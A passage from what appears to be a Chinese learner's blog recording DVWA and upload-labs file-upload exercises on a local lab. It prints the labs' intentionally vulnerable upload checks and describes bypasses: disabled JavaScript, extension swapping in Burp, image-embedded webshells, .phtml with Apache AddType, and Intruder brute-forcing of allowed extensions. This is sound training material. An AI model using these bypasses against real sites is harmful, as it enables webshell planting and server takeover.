src="https://img-blog.csdnimg.cn/20200407224821202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>连接成功了<br><img src="https://img-blog.csdnimg.cn/20200407224857284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看到上次传入的<code>lxj.txt</code>，删了，收工。<br><img src="https://img-blog.csdnimg.cn/20200407225030490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="high级别测试"><a href="#high级别测试" class="headerlink" title="high级别测试"></a>high级别测试</h2><p>还是先看看代码再说（虽然不能完全看懂，但好歹能看懂几句。哈哈）<br><img src="https://img-blog.csdnimg.cn/2020040911083476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="实验操作-1"><a href="#实验操作-1" class="headerlink" title="实验操作"></a>实验操作</h3><p>代码限制了上传文件的类型和格式，其实试着传一个文件可以发现，它限制了文件的扩展名，所以只能上传图片。</p><h4 id="第一次错误尝试"><a href="#第一次错误尝试" class="headerlink" title="第一次错误尝试"></a>第一次错误尝试</h4><p>把写的一句话木马，写好，改成jpg格式。<br><img src="https://img-blog.csdnimg.cn/20200409134047754.png" alt="Augenstern" loading="lazy"><br>将后缀改成jpg。然后上传，（其实挺意外的竟然传过去了，连burp都没用到，有点不对劲啊。）<br><img src="https://img-blog.csdnimg.cn/20200409134307723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>查看是打不开的<br><img src="https://img-blog.csdnimg.cn/20200409134428491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>连接也是失败的。<br><img src="https://img-blog.csdnimg.cn/20200409134754408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>接下来不会了，搞不明白什么情况了。<br>看了大佬的文章进行学习，因为视频资源有点老了，DVWA已经更新了，前两个等级还好，还能用，高级的就不好用了。所以果断百度大佬的文章继续进行接下来的学习。</p><h4 id="第二次错误尝试（图片马）"><a href="#第二次错误尝试（图片马）" class="headerlink" title="第二次错误尝试（图片马）"></a>第二次错误尝试（图片马）</h4><p>将一句话木马与一张图片进行合成。<br><img src="https://img-blog.csdnimg.cn/20200409141738384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>合成之后<br><img src="https://img-blog.csdnimg.cn/20200409141757565.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开看下，发现被合成到最后面了。<br><img src="https://img-blog.csdnimg.cn/20200409141942516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>上传一下，试试。<br><img src="https://img-blog.csdnimg.cn/20200409142234818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>又成功了，莫名的有点慌，这次应该能看吧。<br><img src="https://img-blog.csdnimg.cn/20200409142411949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看，那就复制URL进蚁剑尝试连接。<br><img src="https://img-blog.csdnimg.cn/20200409142630778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>？？？？？<br><img src="https://img-blog.csdnimg.cn/20200409143008943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>卡到这里了，完蛋，关于DVWA的high高级上传希望各位看到的师傅们指点我一下，万分感谢。<br><img src="https://img-blog.csdnimg.cn/20200417154456552.png" alt="Augenstern" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞——upload-labs靶场学习</title>
      <link href="/posts/1158347a/"/>
      <url>/posts/1158347a/</url>
      
        <content type="html"><![CDATA[<p>前言：之前在DVWA靶场上了解了upload文件上传漏洞，并进行了学习，现在来安装upload-labs来打一下靶场。</p><h1 id="搭建靶场"><a href="#搭建靶场" class="headerlink" title="搭建靶场"></a>搭建靶场</h1><p>phpstudy集成环境。<br>upload-labs项目地址<a href="https://github.com/c0ny1/upload-labs">upload-labs</a>，下载压缩包解压到本地phpstudy的www文件夹下，将文件夹命名为<code>upload-labs</code>(个人选择)，也可以不改。<br>打开phpstudy，开启环境在浏览器中访问<code>127.0.0.1/upload-labs</code>就可以进入靶场。<br><img src="https://img-blog.csdnimg.cn/20200426124534142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h1 id="开始闯关"><a href="#开始闯关" class="headerlink" title="开始闯关"></a>开始闯关</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>第一步查看源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token constant">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//定义允许上传的文件类型</span>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token double-quoted-string string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    <span class="token comment">//提取上传文件的类型</span>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//判断上传文件类型是否允许上传</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token double-quoted-string string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token double-quoted-string string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token double-quoted-string string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>可以看出可以传入的是<code>.jpg/.png/,gif</code>类型的图片。因为第一关嘛，限制比较简单，有以下几种方法。<br>1.禁用js<br>谷歌浏览器禁用js，可以百度搜索，不再多说。<br>火狐浏览器推荐一个插件<code>noscript</code>，禁用js后就可以上传php文件了。<br>2.burp抓包修改后缀，<br>先将要上传的<code>shell.php</code>后缀改成图片格式，比如jpg。<br>然后上传，抓包，修改回<code>shell.php</code>放包。上传成功。<br>3.直接传图片马</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>查看源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这个是对Content-type的MIME类型进行限制。<br>在DVWA中尝试过了已经，<br>抓包，对Content-type进行修改，改为<code>image/jpeg</code>或者其他两种类型。不再赘述。</p><h2 id="Pass-03黑名单验证"><a href="#Pass-03黑名单验证" class="headerlink" title="Pass-03黑名单验证"></a>Pass-03黑名单验证</h2><h3 id="普通方法"><a href="#普通方法" class="headerlink" title="普通方法"></a>普通方法</h3><p>查看源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.asp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.aspx'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这个原本不知道该怎么操作，看了大佬的博客才知道了这个是黑名单过滤，服务器把后缀为<code>.asp .aspx .php .,jps</code> 的文件给过滤了，要想办法绕过这些。可以上传其他任意后缀。比如说:.phtml .phps .php5 .pht，但如果上传的是.php5这种类型文件的话，如果想要被当成php执行的话，前提条件是Apache的httpd.conf有如下配置代码</p><pre class="language-bash" data-language="bash"><code class="language-bash">AddType application/x-httpd-php .php .phtml .php5 .pht .phps</code></pre><p>让Apache能够解析这些后缀的文件。<br>配置路径<br><code>D:\phpStudy\PHPTutorial\Apache\conf</code>我的是phpstudy集成环境，所以在phpstudy目录下。找到(httpd.conf)这个文件打开<br><img src="https://img-blog.csdnimg.cn/20200426132330859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>修改成图中的样子。<br>这个时候就可以将后缀改为<code>.phtml</code>再次上传<br>上传成功<br><img src="https://img-blog.csdnimg.cn/20200426141548939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>用蚁剑连接一下,连接失败。emmm挺烦的这个，好长时间了，还卡在这里，暂时，方法没错，可是我连接本地的就是连不上，无语啦。</p><h3 id="使用burpsuite爆破黑名单"><a href="#使用burpsuite爆破黑名单" class="headerlink" title="使用burpsuite爆破黑名单"></a>使用burpsuite爆破黑名单</h3><p>了解到一种方法，可能比较少见，现在分享一下<br>不改名，直接上传php文件<br><img src="https://img-blog.csdnimg.cn/20200509224024679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>开代理抓包，然后<code>Send to intruder</code><br><img src="https://img-blog.csdnimg.cn/2020050922414186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>进行php扩展名的爆破<br><img src="https://img-blog.csdnimg.cn/20200509224249905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>选择字典，或者自己添加参数。<br><img src="https://img-blog.csdnimg.cn/20200509224434638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>随便写几个吧，栗子而已。<br>然后就可以开始爆破了。<br><img src="https://img-blog.csdnimg.cn/20200509224620148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>上面的是可以上传的，下面的则是不符合条件的。<br>所以就知道应该传入什么文件了。(可能想的是，这也没有什么啊，还不如直接上传phtml方便。继续看)<br>然后右键单击一个，找到<code>Show response in browser</code><br><img src="https://img-blog.csdnimg.cn/20200509224829441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>点击copy，然后粘贴到浏览器<br><img src="https://img-blog.csdnimg.cn/20200509225054720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>记住关代理，暂停抓包，复制到浏览器跑一下<br><img src="https://img-blog.csdnimg.cn/2020050922522639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>会发现已经上传成功了，那其他的呢，也可以都试试。<br>我全部上传，最后看效果。<br>上传完成了，可以打开upload文件查看<br><img src="https://img-blog.csdnimg.cn/2020050922561114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>害，，还是连接不成功，不知道是哪里出的问题，已经困扰我好久了。太难了我。<br>没解决，访问直接下载phtml文件。无语啦=_=</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>这一关，传phtml文件不行了，也被加入了黑名单，所以先查看下源码，<br>查看源码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token 